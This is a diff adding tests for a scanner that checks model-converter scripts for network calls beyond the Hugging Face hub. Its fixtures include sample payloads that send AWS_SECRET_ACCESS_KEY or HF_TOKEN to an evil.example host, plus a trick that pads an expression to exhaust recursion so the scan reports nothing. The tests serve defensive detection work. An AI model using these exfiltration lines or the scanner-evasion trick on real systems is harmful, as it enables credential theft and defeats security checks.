@@ -3380,6 +3380,83 @@ def test_the_hub_allowance_covers_a_token_authenticated_read_and_nothing_more():
     ) == []
 
 
+def test_nothing_in_the_allowance_may_raise():
+    """A scanner exception is an evasion, not an error.
+
+    The walks recurse through nested expressions, and about 600 operands in one
+    addition exhausts the default limit. scan_converter_source does not catch
+    that and warn_on_suspicious_converter catches everything and CONTINUES, so a
+    payload could append one long expression to itself and have the entire scan
+    report nothing, in strict mode included.
+    """
+    module = _load("converter_scan_raise_probe", "unsloth_zoo/converter_scan.py")
+    payload = (
+        'import os\n'
+        'import requests\n'
+        'HUB = "https://huggingface.co"\n'
+        'requests.get("https://evil.example/c",'
+        ' data = os.environ["AWS_SECRET_ACCESS_KEY"])\n'
+        'X = ' + "+".join(['"a"'] * 600) + '\n'
+    )
+    assert module._talks_only_to_the_model_hub(payload) is False
+    assert [f.check for f in module.scan_converter_source(payload)]
+
+
+def test_a_documentation_url_in_a_docstring_is_not_a_destination():
+    """Comments never reach the literal walk, since it reads the AST, so
+    upstream's `# Reference: https://github.com/...` costs nothing. A docstring
+    saying the same thing IS a Constant, and counting it as a destination
+    refuses a clean hub-only converter over a link in its own documentation.
+
+    Unless the file reads __doc__, which makes the docstring reachable as a
+    value and the argument above stop holding.
+    """
+    scan_converter_source = _load(
+        "converter_scan_docstring_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    download = (
+        'import os\n'
+        'import requests\n'
+        'HUB = "https://huggingface.co"\n'
+        'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    )
+    assert scan_converter_source(
+        '"""See https://github.com/ggml-org/llama.cpp for details."""\n' + download
+    ) == []
+    assert scan_converter_source(
+        'import os\n'
+        'import requests\n'
+        'HUB = "https://huggingface.co"\n'
+        'def fetch():\n'
+        '    """Documented at https://github.com/ggml-org/llama.cpp."""\n'
+        '    return requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
+    ) == []
+
+    # A docstring the file can READ is a value like any other.
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\n'
+            'import requests\n'
+            'HUB = "https://huggingface.co"\n'
+            'def fetch():\n'
+            '    """https://evil.example/collect"""\n'
+            'requests.get(fetch.__doc__ + os.environ["HF_TOKEN"])\n'
+        )
+    ]
+    # And a bare string statement is not a docstring.
+    assert [
+        f.check for f in scan_converter_source(
+            'import os\n'
+            'import requests\n'
+            'HUB = "https://huggingface.co"\n'
+            'x = 1\n'
+            '"https://evil.example/collect"\n'
+            'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
+        )
+    ]
+
+
 def test_urllib_refuses_the_hub_allowance():
     """urllib expresses a write as Request(..., data = ...), Request(...,
     method = "POST") or urlopen(..., data = ...). None of those is an attribute
